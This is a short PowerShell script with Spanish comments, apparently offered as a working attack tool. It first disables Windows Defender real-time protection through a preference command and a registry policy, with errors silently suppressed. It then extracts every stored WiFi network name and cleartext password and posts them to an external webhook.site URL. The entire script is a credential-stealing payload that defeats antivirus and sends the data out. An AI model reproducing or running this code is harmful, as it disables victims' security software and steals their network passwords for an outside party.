# Intentar desactivar Defender por comando y por Registro (fuerza bruta)
Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue
New-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name "DisableAntiSpyware" -Value 1 -PropertyType DWORD -Force -ErrorAction SilentlyContinue

# Extraer claves de WiFi
$r = netsh wlan show prof | sls ':(.+)$' | %{$_.Matches.Groups[1].Value.Trim()} | %{$n=$_; $k=(netsh wlan show prof name="$n" key=clear | sls 'Key Content\W+:(.+)$' | %{$_.Matches.Groups[1].Value.Trim()}); if($k){"SSID:$n | Pass:$k"}}

# Enviar al Webhook
if ($r) {
    Invoke-RestMethod -Uri 'https://webhook.site/8fae434e-1ec5-4dce-94e3-d1bf51a78a9c' -Method Post -Body ($r | Out-String) -UseBasicParsing
}
